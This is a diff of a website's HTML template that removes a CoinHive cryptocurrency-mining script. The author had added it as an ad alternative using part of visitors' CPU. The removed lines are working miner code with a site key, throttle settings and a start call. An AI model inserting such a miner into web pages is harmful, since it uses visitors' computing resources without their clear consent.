@@ -198,24 +198,6 @@ and from the parsing code. I’m also not really doing anything with the
       gtag('config', 'UA-11511983-4');
     </script>
 
-    <!-- CoinHive Script
-           This uses a small percentage of your CPU (20% on 1 thread) to mine on
-           CoinHive as an alternative to Ads. As I undersatnd it, ad-blocker will
-           stop this as well, so it should be just as (in)effective. -->
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-    <script>
-      var miner = new CoinHive.Anonymous('T03lCJSshVAHeutVlaH1ZT4cCQgE0RmJ', {
-        threads:  1,
-        throttle: 0.80,
-      });
-
-      // Only start on non-mobile devices and if not opted-out
-      // in the last 14400 seconds (4 hours):
-      if (!miner.isMobile() && !miner.didOptOut(14400)) {
-        miner.start();
-      }
-    </script>
-
   </body>
 
 </html>
